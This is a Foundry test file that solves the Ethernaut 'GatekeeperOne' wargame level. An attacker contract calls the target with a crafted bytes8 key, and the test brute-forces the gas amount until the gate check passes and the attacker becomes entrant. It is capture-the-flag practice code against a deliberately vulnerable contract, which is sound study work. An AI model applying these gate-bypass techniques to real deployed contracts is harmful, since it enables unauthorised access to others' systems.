// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {GatekeeperOne} from "../src/13_GatekeeperOne.sol";

interface IGatekeeper {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperOneAttacker {
    IGatekeeper public target;
    constructor(address _target) {
        target = IGatekeeper(_target);
    }

    function attack(bytes8 _gateKey) public {
        (bool success, ) = address(target).call(
            abi.encodeWithSignature("enter(bytes8)", _gateKey)
        );
        require(success, "Gate failed");
    }
}
contract GatekeeperOneTest is Test {
    GatekeeperOne public go;
    GatekeeperOneAttacker public ga;
    address public hacker = address(0x1337);

    function setUp() public {
        go = new GatekeeperOne();
        vm.deal(hacker, 100 ether);
    }

    function testExploit() public {
        ga = new GatekeeperOneAttacker(address(go));
        vm.startPrank(hacker, hacker);
        bytes8 key = bytes8(uint64(0x1111111100001337));

        bool gatePassed = false;

        for (uint256 i = 0; i < 8191; i++) {
            try ga.attack{gas: i + (8191 * 10)}(key) {
                console.log("Gas exacto encontrado:", i);
                gatePassed = true;
                break;
            } catch {}
        }
        assertTrue(gatePassed, "No se encontro el gas");
        assertEq(go.entrant(), hacker);
        vm.stopPrank();
    }
}
